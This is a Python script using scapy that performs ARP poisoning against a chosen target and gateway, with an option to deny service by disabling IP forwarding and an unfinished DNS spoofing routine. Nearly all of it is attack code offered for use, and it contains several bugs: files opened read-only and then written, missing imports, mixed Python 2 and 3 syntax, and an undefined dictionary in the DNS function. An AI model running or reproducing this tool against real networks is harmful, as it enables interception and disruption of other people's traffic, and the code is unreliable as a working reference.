from scapy.all import *
import argparse
import os

def getMac(ipAdress, timeout=2):
	answered, unanswered = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ipAdress), timeout = timeout, retry = 2, verbose = False)

	if len(answered) >= 1:

		request, response = answered[0]

		return response[Ether].src
	else:
		return None

def poisonTarget(gateway_ip, gateway_mac, target_ip, target_mac):
	poisonPacketTarget = craftArpPacket(2, target_ip, gateway_ip, target_mac)
	poisonPacketRouter = craftArpPacket(2, gateway_ip, target_ip, gateway_mac)

	print('Starting ARP Poison')

	while(1):
		try:
			send(poisonPacketTarget, verbose = False)
			send(poisonPacketRouter, verbose = False)
			time.sleep(1)

		except KeyboardInterrupt:
			restoreTarget(gateway_ip, gateway_mac, target_ip, target_mac)
			print('Stoping ARP Poison')
			return

def restoreTarget(gateway_ip, gateway_mac, target_ip, target_mac):
	restorePacketTarget = craftArpPacket(2, target_ip, gateway_ip, target_mac, gateway_mac)
	restorePacketRouter = craftArpPacket(2, gateway_ip, target_ip, gateway_mac, target_mac)

	send(restorePacketTarget, verbose = False)
	send(restorePacketRouter, verbose = False)

	return

def craftArpPacket(opCode, dstIP, srcIp, dstMac, srcMac = None):
	arpPacket = ARP()
	arpPacket.op = opCode
	arpPacket.psrc = srcIp
	arpPacket.pdst = dstIP
	arpPacket.hwdst = dstMac

	if srcMac != None:
		arpPacket.hwsrc = srcMac


	return arpPacket

def enableForwardPackets():
	file_ip_forward = open('/proc/sys/net/ipv4/ip_forward', 'r')
	file_ip_forward.write('1')
	file_ip_forward.close()

def disableForwardPackets():
	file_ip_forward = open('/proc/sys/net/ipv4/ip_forward', 'r')
	file_ip_forward.write('0')
	file_ip_forward.close()

def dnsSpoofing():
	#in progress
	#read config file, build a dictionary
	
	def processPacket(packet):
		if(packet.haslayer('DNS')):
			if(packet[DNS].qd.haslayer('DNSQR')):

				target_url = packet[DNS].qd.qname

				if(target_url in dictionary):
					packet[DNS].qd.qname = dictionary[target_url]


		send(packet)

	sniff(i='eth0', callback = 'processPacket')

if __name__ == '__main__':

	if(os.getuid() != 0):
		print('You must run this as root')		
		sys.exit(1)

	parser = argparse.ArgumentParser()
	requiredArguments = parser.add_argument_group('required arguments')
	requiredArguments.add_argument("-t", "--target", help="target ip address", required = True)
	requiredArguments.add_argument("-g", "--gateway", help="gateway ip address", required = True)
	parser.add_argument("--dosMode", help="DoS Mode", action = "store_true")

	args = parser.parse_args()

	if(not args.dosMode):
		enableForwardPackets()
	else:
		disableForwardPackets()

	target_mac = getMac(args.target)
	gateway_mac = getMac(args.gateway)

	if (target_mac == None or gateway_mac == None):
		print 'Failing getting MAC'
		sys.exit(1)

	poisonTarget(args.gateway, gateway_mac, args.target, target_mac)

	disableForwardPackets()